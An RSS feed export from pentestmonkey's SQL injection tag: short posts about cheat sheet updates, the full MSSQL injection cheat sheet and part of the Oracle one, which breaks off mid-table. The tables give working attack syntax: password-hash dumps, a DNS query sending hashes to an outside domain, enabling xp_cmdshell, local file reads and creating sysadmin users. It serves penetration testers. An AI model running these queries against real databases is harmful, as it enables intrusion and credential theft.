<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>sqlinjection &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/sqlinjection/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sat, 10 Mar 2012 19:00:28 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>SQL Injection Cheat Sheets Updated</title>
		<link>https://pentestmonkey.net/blog/sqlics-update</link>
					<comments>https://pentestmonkey.net/blog/sqlics-update#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 21 Oct 2008 13:09:57 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=69</guid>

					<description><![CDATA[I had some really detailed feedback from Bernardo Damele A. G. on the SQL Injection Cheat Sheets.  I&#8217;ve just finished updating the cheat sheets for MSSQL, Oracle, MySQL and PostgreSQL . Thanks a lot Bernardo. If anyone else has suggestions, feel free to mail pentestmonkey at pentestmonkey dot net.]]></description>
										<content:encoded><![CDATA[<p>I had some really detailed feedback from <a href="http://bernardodamele.blogspot.com">Bernardo Damele A. G.</a> on the SQL Injection Cheat Sheets.  I&#8217;ve just finished updating the cheat sheets for <a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a>, <a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a>, <a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a> and <a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a> .</p>
<p>Thanks a lot Bernardo.</p>
<p>If anyone else has suggestions, feel free to mail pentestmonkey at pentestmonkey dot net.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/sqlics-update/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Update to Postgres SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/postgresics-update3</link>
					<comments>https://pentestmonkey.net/blog/postgresics-update3#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 10 Aug 2008 11:39:32 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[database]]></category>
		<category><![CDATA[postgresql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=60</guid>

					<description><![CDATA[Reiners spotted that I hadn&#8217;t included any info about writing files via SLQ injection in PostgreSQL.  I&#8217;ve update the Postgres Cheat Sheet accordingly.  Thanks Reiners. He&#8217;s also written some detailed blogs about SQL injection in MySQL that are worth reading: MySQL Table and Column Names MySQL Into Outfile &#160;]]></description>
										<content:encoded><![CDATA[<p><a href="http://websec.wordpress.com">Reiners</a> spotted that I hadn&#8217;t included any info about writing files via SLQ injection in PostgreSQL.  I&#8217;ve update the <a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">Postgres Cheat Sheet </a> accordingly.  Thanks Reiners.</p>
<p>He&#8217;s also written some detailed blogs about SQL injection in MySQL that are worth reading:</p>
<ul>
<li><a href="http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/">MySQL Table and Column Names</a></li>
<li><a href="http://websec.wordpress.com/2007/11/17/mysql-into-outfile/">MySQL Into Outfile</a></li>
</ul>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/postgresics-update3/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>SQL Injection Where You Wouldn&#8217;t Have Thought It Possible</title>
		<link>https://pentestmonkey.net/blog/david-litchfield-lateral-sql-injection</link>
					<comments>https://pentestmonkey.net/blog/david-litchfield-lateral-sql-injection#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Thu, 24 Apr 2008 20:23:27 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[oracle]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=52</guid>

					<description><![CDATA[David Litchfield just released a new paper: &#8220;A New Class of Vulnerability in Oracle: Lateral SQL Injection&#8220;. It&#8217;s a quick read at only 4 pages and very well explained if you&#8217;re a pentesting-type.  Well worth a read.]]></description>
										<content:encoded><![CDATA[<p>David Litchfield just released a new paper: &#8220;<a href="http://www.databasesecurity.com/dbsec/lateral-sql-injection.pdf">A New Class of Vulnerability in Oracle: Lateral SQL Injection</a>&#8220;.</p>
<p>It&#8217;s a quick read at only 4 pages and very well explained if you&#8217;re a pentesting-type.  Well worth a read.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/david-litchfield-lateral-sql-injection/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>SQL Cheat Sheet Updates</title>
		<link>https://pentestmonkey.net/blog/sqlics-managing-users</link>
					<comments>https://pentestmonkey.net/blog/sqlics-managing-users#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 08 Apr 2008 20:26:34 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=48</guid>

					<description><![CDATA[I&#8217;ve recently updated the MySQL, MSSQL and PostgreSQL cheat sheets with some notes on creating and deleting users.  Info on granting DBA rights is also included. This is useful for those situtations where you&#8217;ve found a SQL inject as a privileged user and also have have access to the database port (1433/TCP or whatever).]]></description>
										<content:encoded><![CDATA[<p>I&#8217;ve recently updated the <a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a>, <a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a> and <a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a> cheat sheets with some notes on creating and deleting users.  Info on granting DBA rights is also included.</p>
<p>This is useful for those situtations where you&#8217;ve found a SQL inject as a privileged user and also have have access to the database port (1433/TCP or whatever).</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/sqlics-managing-users/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Update: MSSQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/mssqlics-update</link>
					<comments>https://pentestmonkey.net/blog/mssqlics-update#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 06 Apr 2008 16:32:12 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[mssql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=46</guid>

					<description><![CDATA[I just made some minor additions to the MSSQL Injection Cheat Sheet : Creating Users Deleting Users Assigning Users the DBA privilege]]></description>
										<content:encoded><![CDATA[<p>I just made some minor additions to the <a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL Injection Cheat Sheet</a> :</p>
<ul>
<li>Creating Users</li>
<li>Deleting Users</li>
<li>Assigning Users the DBA privilege</li>
</ul>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/mssqlics-update/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Updated Postgres SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/postgresics-update2</link>
					<comments>https://pentestmonkey.net/blog/postgresics-update2#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Mon, 21 Jan 2008 21:10:41 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[postgresql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=38</guid>

					<description><![CDATA[I just put some finishing touches to the PostgreSQL Injection Cheat Sheet .  All the TODO items have been removed now.  Let me know if you have any extra info you think should be included on the cheat sheet.]]></description>
										<content:encoded><![CDATA[<p>I just put some finishing touches to the <a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL Injection Cheat Sheet</a> .  All the TODO items have been removed now.  <a href="mailto:pentestmonkeyAATTpentestmonkey.net">Let me know</a> if you have any extra info you think should be included on the cheat sheet.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/postgresics-update2/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Updated Postgres SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/postgresics-update</link>
					<comments>https://pentestmonkey.net/blog/postgresics-update#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 15 Jan 2008 08:35:08 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[postgressql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=34</guid>

					<description><![CDATA[I just read Nico Leidecker&#8217;s Having Fun With Postgres paper.  He mostly talks about the dblink function which is sometimes enabled in Postgres &#8211; it&#8217;s a bit like MSSQL&#8217;s openrowset .  There&#8217;s also some good generic advice on what to do when you get DBA access &#8211; like exeucting OS-level commands.  I&#8217;ve updated the cheat [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I just read Nico Leidecker&#8217;s <a href="http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.html">Having Fun With Postgres</a> paper.  He mostly talks about the dblink function which is sometimes enabled in Postgres &#8211; it&#8217;s a bit like MSSQL&#8217;s <a href="http://msdn2.microsoft.com/en-us/library/ms190312.aspx">openrowset</a> .  There&#8217;s also some good generic advice on what to do when you get DBA access &#8211; like exeucting OS-level commands.  I&#8217;ve updated the <a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">cheat sheet</a> .  Good work Nico!</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/postgresics-update/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Update to MySQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/mysqlics-update</link>
					<comments>https://pentestmonkey.net/blog/mysqlics-update#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Wed, 02 Jan 2008 22:26:42 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[mysql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=31</guid>

					<description><![CDATA[I just added some more notes to the MySQL Injection Cheat Sheet about command executation, file upload, privilege enumeration, casting, avoiding quotes and more.  The cheat sheet is reasonably complete now.]]></description>
										<content:encoded><![CDATA[<p>I just added some more notes to the <a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL Injection Cheat Sheet</a> about command executation, file upload, privilege enumeration, casting, avoiding quotes and more.  The cheat sheet is reasonably complete now.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/mysqlics-update/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>MSSQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 27 Nov 2007 20:23:00 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[mssql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=88</guid>

					<description><![CDATA[Some useful syntax reminders for SQL Injection into MSSQL databases&#8230; This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Some useful syntax reminders for SQL Injection into MSSQL databases&#8230;<br />
<span id="more-88"></span></p>
<p>This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<p>Some of the queries in the table below can only be run by an admin. These are marked with &#8220;&#8211; priv&#8221; at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT @@version</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1 &#8212; comment<br />
SELECT /*comment*/1</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user_name();<br />
SELECT system_user;<br />
SELECT user;<br />
SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT name FROM master..syslogins</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT name, password FROM master..sysxlogins &#8212; priv, mssql 2000;<br />
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins &#8212; priv, mssql 2000.  Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.<br />
SELECT name, password_hash FROM master.sys.sql_logins &#8212; priv, mssql 2005;<br />
SELECT name + &#8216;-&#8216; + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins &#8212; priv, mssql 2005</td>
</tr>
<tr>
<td> Password Cracker</td>
<td>MSSQL 2000 and 2005 Hashes are both SHA1-based.  <a href="https://labs.portcullis.co.uk/application/phrasen-drescher/">phrasen|drescher</a> can crack these.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>&#8212; current privs on a particular object in 2005, 2008<br />
SELECT permission_name FROM master..fn_my_permissions(null, &#8216;DATABASE&#8217;); &#8212; current database<br />
SELECT permission_name FROM master..fn_my_permissions(null, &#8216;SERVER&#8217;); &#8212; current server<br />
SELECT permission_name FROM master..fn_my_permissions(&#8216;master..syslogins&#8217;, &#8216;OBJECT&#8217;); &#8211;permissions on a table<br />
SELECT permission_name FROM master..fn_my_permissions(&#8216;sa&#8217;, &#8216;USER&#8217;);</p>
<p>&#8211;permissions on a user&#8211; current privs in 2005, 2008<br />
SELECT is_srvrolemember(&#8216;sysadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;dbcreator&#8217;);<br />
SELECT is_srvrolemember(&#8216;bulkadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;diskadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;processadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;serveradmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;setupadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;securityadmin&#8217;);</p>
<p>&#8212; who has a particular priv? 2005, 2008<br />
SELECT name FROM master..syslogins WHERE denylogin = 0;<br />
SELECT name FROM master..syslogins WHERE hasaccess = 1;<br />
SELECT name FROM master..syslogins WHERE isntname = 0;<br />
SELECT name FROM master..syslogins WHERE isntgroup = 0;<br />
SELECT name FROM master..syslogins WHERE sysadmin = 1;<br />
SELECT name FROM master..syslogins WHERE securityadmin = 1;<br />
SELECT name FROM master..syslogins WHERE serveradmin = 1;<br />
SELECT name FROM master..syslogins WHERE setupadmin = 1;<br />
SELECT name FROM master..syslogins WHERE processadmin = 1;<br />
SELECT name FROM master..syslogins WHERE diskadmin = 1;<br />
SELECT name FROM master..syslogins WHERE dbcreator = 1;<br />
SELECT name FROM master..syslogins WHERE bulkadmin = 1;</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT is_srvrolemember(&#8216;sysadmin&#8217;); &#8212; is your account a sysadmin?  returns 1 for true, 0 for false, NULL for invalid role.  Also try &#8216;bulkadmin&#8217;, &#8216;systemadmin&#8217; and other values from the <a href="http://msdn.microsoft.com/en-us/library/ms176015.aspx">documentation<br />
</a> SELECT is_srvrolemember(&#8216;sysadmin&#8217;, &#8216;sa&#8217;); &#8212; is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.<br />
SELECT name FROM master..syslogins WHERE sysadmin = &#8216;1&#8217; &#8212; tested on 2005</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT DB_NAME()</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT name FROM master..sysdatabases;<br />
SELECT DB_NAME(N); &#8212; for N = 0, 1, 2, &#8230;</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = &#8216;mytable&#8217;); &#8212; for the current DB only<br />
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#8217;sometable&#8217;; &#8212; list colum names and types for master..sometable</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT name FROM master..sysobjects WHERE xtype = &#8216;U&#8217;; &#8212; use xtype = &#8216;V&#8217; for views<br />
SELECT name FROM someotherdb..sysobjects WHERE xtype = &#8216;U&#8217;;<br />
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#8217;sometable&#8217;; &#8212; list colum names and types for master..sometable</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>&#8212; NB: This example works only for the current database.  If you wan&#8217;t to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).<br />
SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = &#8216;U&#8217; AND syscolumns.name LIKE &#8216;%PASSWORD%&#8217; &#8212; this lists table, column for each column containing the word &#8216;password&#8217;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC &#8212; gets 9th row</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substring(&#8216;abcd&#8217;, 3, 1) &#8212; returns c</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT 6 &amp; 2 &#8212; returns 2<br />
SELECT 6 &amp; 1 &#8212; returns 0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT char(0x41) &#8212; returns A</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(&#8216;A&#8217;) &#8211; returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT CAST(&#8216;1&#8217; as int);<br />
SELECT CAST(1 as char)</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;A&#8217; + &#8216;B&#8217; &#8211; returns AB</td>
</tr>
<tr>
<td>If Statement</td>
<td><span>IF (1=1) SELECT 1 ELSE SELECT 2 &#8212; returns 1</span></td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END &#8212; returns 1</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT char(65)+char(66) &#8212; returns AB</td>
</tr>
<tr>
<td>Time Delay</td>
<td> WAITFOR DELAY &#8216;0:0:5&#8217; &#8212; pause for 5 seconds</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>declare @host varchar(800); select @host = name FROM master..syslogins; exec(&#8216;master..xp_getfiledetails &#8221;\&#8217; + @host + &#8216;c$boot.ini&#8221;&#8217;); &#8212; nonpriv, works on 2000declare @host varchar(800); select @host = name + &#8216;-&#8216; + master.sys.fn_varbintohexstr(password_hash) + &#8216;.2.pentestmonkey.net&#8217; from sys.sql_logins; exec(&#8216;xp_fileexist &#8221;\&#8217; + @host + &#8216;c$boot.ini&#8221;&#8217;); &#8212; priv, works on 2005&#8211; NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.<br />
&#8212; Also check out theDNS tunnel feature of <a href="http://sqlninja.sourceforge.net/sqlninja-howto.html">sqlninja</a></td>
</tr>
<tr>
<td>Command Execution</td>
<td>EXEC xp_cmdshell &#8216;net user&#8217;; &#8212; privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it&#8217;s disabled by default:<br />
EXEC sp_configure &#8216;show advanced options&#8217;, 1; &#8212; priv<br />
RECONFIGURE; &#8212; priv<br />
EXEC sp_configure &#8216;xp_cmdshell&#8217;, 1; &#8212; priv<br />
RECONFIGURE; &#8212; priv</td>
</tr>
<tr>
<td>Local File Access</td>
<td>CREATE TABLE mydata (line varchar(8000));<br />
BULK INSERT mydata FROM &#8216;c:boot.ini&#8217;;<br />
DROP TABLE mydata;</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT HOST_NAME()</td>
</tr>
<tr>
<td>Create Users</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx">sp_addlogin</a> &#8216;user&#8217;, &#8216;pass&#8217;; &#8212; priv</td>
</tr>
<tr>
<td>Drop Users</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx">sp_droplogin</a> &#8216;user&#8217;; &#8212; priv</td>
</tr>
<tr>
<td>Make User DBA</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx">master.dbo.sp_addsrvrolemember</a> &#8216;user&#8217;, &#8216;sysadmin; &#8212; priv</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>EXEC sp_helpdb master; &#8211;location of master.mdf<br />
EXEC sp_helpdb pubs; &#8211;location of pubs.mdf</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>northwind<br />
model<br />
msdb<br />
pubs &#8212; not on sql server 2005<br />
tempdb</td>
</tr>
</tbody>
</table>
<h3>Misc Tips</h3>
<p>In no particular order, here are some suggestions from pentestmonkey readers.</p>
<p><strong>From Dan Crowley:</strong><br />
<a href="http://www.notsosecure.com/folder2/2010/06/29/mysql-exploitation-with-error-messages">A way to extract data via SQLi with a MySQL backend</a></p>
<p><strong>From Jeremy Bae:</strong><br />
Tip about sp_helpdb &#8211; included in table above.</p>
<p><strong>From Trip:</strong><br />
List DBAs (included in table above now):</p>
<blockquote><p>select name from master..syslogins where sysadmin = &#8216;1&#8217;</p></blockquote>
<p><strong>From Daniele Costa:</strong><br />
Tips on using fn_my_permissions in 2005, 2008 &#8211; included in table above.<br />
Also:<br />
To check permissions on multiple database you will have to use the following pattern.</p>
<blockquote><p>USE [DBNAME]; select permission_name   FROM fn_my_permissions (NULL, &#8216;DATABASE&#8217;)</p></blockquote>
<p>Note also that in case of using this data with a UNION query a collation error could occur.<br />
In this case a simple trick is to use the following syntax:</p>
<blockquote><p> select permission_name collate database_default  FROM fn_my_permissions (NULL, &#8216;DATABASE&#8217;)
</p></blockquote>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Oracle SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 27 Nov 2007 20:20:14 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[database]]></category>
		<category><![CDATA[oracle]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=87</guid>

					<description><![CDATA[Some useful syntax reminders for SQL Injection into Oracle databases&#8230; This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Some useful syntax reminders for SQL Injection into Oracle databases&#8230;<br />
<span id="more-87"></span></p>
<p>This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<p>Some of the queries in the table below can only be run by an admin.  These are marked with &#8220;&#8211; priv&#8221; at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT banner FROM v$version WHERE banner LIKE &#8216;Oracle%&#8217;;<br />
SELECT banner FROM v$version WHERE banner LIKE &#8216;TNS%&#8217;;<br />
SELECT version FROM v$instance;</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1 FROM dual &#8212; comment<br />
&#8212; NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name &#8216;dual&#8217; when we&#8217;re not actually selecting from a table.</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user FROM dual</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT username FROM all_users ORDER BY username;<br />
SELECT name FROM sys.user$; &#8212; priv</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT name, password, astatus FROM sys.user$ &#8212; priv, &lt;= 10g.  astatus tells you if acct is locked<br />
SELECT name,spare4 FROM sys.user$ &#8212; priv, 11g</td>
</tr>
<tr>
<td> Password Cracker</td>
<td><a href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a> will crack the DES-based hashes from Oracle 8, 9 and 10.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>SELECT * FROM session_privs; &#8212; current privs<br />
SELECT * FROM dba_sys_privs WHERE grantee = &#8216;DBSNMP&#8217;; &#8212; priv, list a user&#8217;s privs<br />
SELECT grantee FROM dba_sys_privs WHERE privilege = &#8216;SELECT ANY DICTIONARY&#8217;; &#8212; priv, find users with a particular priv<br />
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = &#8216;YES&#8217;; &#8212; priv, list DBAs, DBA roles</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT global_name FROM global_name;<br />
SELECT name FROM v$database;<br />
SELECT instance_name FROM v$instance;<br />
